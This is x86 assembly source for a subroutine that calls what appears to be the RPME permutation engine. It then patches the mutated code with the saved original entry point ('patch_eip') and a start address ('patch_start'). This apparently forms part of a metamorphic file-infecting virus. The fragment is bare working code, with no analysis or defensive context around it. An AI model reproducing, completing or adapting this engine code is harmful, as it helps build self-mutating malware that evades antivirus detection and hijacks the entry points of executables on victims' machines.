
; subroutine: my_mutate()
; action:
; 1. call standard RPME's mutator
; 2. find get_old_eip subroutine, and insert old_eip there

my_mutate               proc    pascal
                        arg     _root
                        arg     _rnd
                        arg     _malloc
                        pusha
                        cld

                        push    _malloc
                        push    _rnd
                        push    _root
                        call    mutate ;rpme-mut.inc (call std rpme's mutate)

; ---------------------------------------------------------------------------

                        mov     ebx, _root

__cycle1:               cmp     [ebx].h_opcode, 68h ; push nnnn
                        jne     __skip1

                        mov     ecx, ebx
__x1:                   mov     ecx, [ecx].h_nxt ; nxt/next -- no difference
                        or      ecx, ecx
                        jz      __skip1
                        cmp     [ecx].h_opcode, 0E9h
                        je      __x1
                        cmp     [ecx].h_opcode, 58h ; pop eax
                        jne     __skip1

                        mov     edx, ecx
__x2:                   mov     edx, [edx].h_nxt
                        or      edx, edx
                        jz      __skip1
                        cmp     [edx].h_opcode, 0E9h
                        je      __x2
                        cmp     [edx].h_opcode, 0C3h ; ret
                        jne     __skip1

                        mov     eax, patch_eip
                        mov     [ebx].h_opcode.dword ptr 1, eax

                        jmp     __exit1

__skip1:                mov     ebx, [ebx].h_next
                        or      ebx, ebx
                        jnz     __cycle1

                        jmp     __fault
__exit1:

; ---------------------------------------------------------------------------

                        mov     ebx, _root

__cycle2:               cmp     [ebx].h_opcode, 0BDh  ; mov ebp, ...
                        jne     __skip2

                        mov     eax, patch_start
                        mov     [ebx].h_opcode.dword ptr 1, eax

                        jmp     __exit2

__skip2:                mov     ebx, [ebx].h_next
                        or      ebx, ebx
                        jnz     __cycle2

                        jmp     __fault
__exit2:

; ---------------------------------------------------------------------------

__exit:                 popa
                        ret

__fault:                mov     ebx, _root
                        mov     [ebx].h_opcode, 0C3h
                        jmp     __exit
                        
                        endp    ; my_mutate

